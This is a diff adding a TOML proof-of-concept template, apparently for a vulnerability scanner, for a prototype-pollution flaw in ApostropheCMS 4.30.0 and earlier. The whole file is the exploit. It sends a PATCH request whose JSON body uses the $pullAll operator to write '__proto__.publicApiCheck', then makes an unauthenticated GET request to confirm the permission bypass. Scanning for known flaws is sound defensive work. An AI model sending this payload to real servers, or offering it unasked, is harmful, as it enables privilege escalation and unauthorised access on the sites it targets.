@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = "验证ApostropheCMS 4.30.0及之前版本中apos.util.set()函数未过滤__proto__导致的服务端原型污染漏洞。通过PATCH请求利用$pullAll操作符向Object.prototype写入任意值，借助publicApiCheck() gadget实现权限绕过。"
+id = "POC-AVE-2026-0778"
+name = "ApostropheCMS Server-Side Prototype Pollution PoC"
+severity = "critical"
+tags = [
+    "cve-2026-53609",
+    "prototype-pollution",
+    "apostrophecms",
+]
+vuln_id = [
+    "CVE-2026-53609",
+    "AVE-2026-0778",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PATCH"
+path = "/{{BaseURL}}/api/v1/@apostrophecms/article/test-id"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"$pullAll":{"__proto__.publicApiCheck":["function(){return true}"]}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{editor_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/@apostrophecms/article"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["results"]
